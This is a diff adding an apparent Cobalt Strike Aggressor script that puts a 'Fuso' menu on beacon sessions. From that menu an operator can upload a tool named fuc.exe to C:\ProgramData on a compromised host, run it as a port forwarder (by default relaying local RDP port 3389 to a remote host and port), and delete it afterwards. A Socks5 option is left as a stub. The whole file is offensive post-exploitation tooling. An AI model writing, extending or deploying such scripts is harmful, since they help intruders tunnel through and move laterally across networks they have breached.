@@ -1,0 +1,47 @@
+  
+popup beacon_bottom {  
+  $fusobin = script_resource("/bin/fuc.exe");
+  menu "Fuso"{
+      item "Delete" {
+          	local('$bid');
+        	   foreach $bid ($1){
+            	bshell($1, "del /f /s /q fuc.exe");
+        	   }
+      }
+      sub uploadcallback {
+          bcd($bid, $3['UploadPath']); 
+          bupload($bid, $fusobin);
+      }
+      item "Upload" {
+           
+           if(!-exists $fusobin){
+               return;
+           }
+           $bid = $1;
+           $dialog = dialog("Upload", %(UploadPath => "C:\\ProgramData\\", bid => $bid), &uploadcallback);
+		     	 drow_text($dialog, "UploadPath",  "TargetPath:"); 	
+			     dbutton_action($dialog, "Upload");
+			     dialog_show($dialog);
+      }
+      sub execportfwd {
+
+            bshell($bid,"fuc.exe -h  $3['LHOST'] -p  $3['LPORT']  $3['RHOST']   $3['RPORT'] ")
+      }
+      item "PortFwd" {
+         if(!-exists $fusobin){
+               return;
+          }
+          $bid = $1;
+          $dialog = dialog("PortForward", %(RHOST => "127.0.0.1",RPORT => "9000",LHOST => "127.0.0.1",LPORT => "3389", bid => $bid), &execportfwd);
+		     	 drow_text($dialog, "RHOST",  "RHOST:"); 	
+            drow_text($dialog, "RPORT",  "RPORT:");
+            drow_text($dialog, "LHOST",  "LHOST:");
+            drow_text($dialog, "LPORT",  "LPORT:");
+			     dbutton_action($dialog, "Forward");
+			     dialog_show($dialog);
+      }
+      item "Socks5" {
+        println("todo!");
+      }
+  }
+}
